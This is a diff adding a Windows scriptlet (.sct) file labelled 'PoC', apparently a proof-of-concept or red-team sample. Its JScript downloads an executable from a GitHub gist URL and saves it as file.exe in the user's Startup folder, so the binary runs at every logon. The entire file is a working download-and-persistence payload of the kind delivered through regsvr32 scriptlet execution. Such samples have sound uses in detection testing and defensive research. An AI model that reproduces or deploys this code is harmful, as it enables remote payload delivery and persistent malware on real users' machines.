@@ -1,0 +1,28 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<script language="JScript">
+		<![CDATA[
+	    	var w = new ActiveXObject("WScript.Shell");
+            localpath = w.SpecialFolders("Startup") + "\\file.exe";
+            url = "https://gist.githubusercontent.com/2XXE-SRA/ecfa69adc17a6e53b32334be2b708bf1/raw/954af86aee2a7a5bedec53a0662972cdf6f0def2/2.exe";
+
+            var r = new ActiveXObject("MSXML2.XMLHTTP");
+            r.open("GET", url, false);
+            r.send();
+
+            var s = new ActiveXObject("ADODB.Stream");
+            s.Type = 1;
+            s.Mode = 3;
+            s.Open();
+
+            s.Write(r.ResponseBody);
+            s.Position = 0;
+            s.SaveToFile(localpath);
+            s.Close;
+		]]>
+</script>
+</registration>
+</scriptlet>
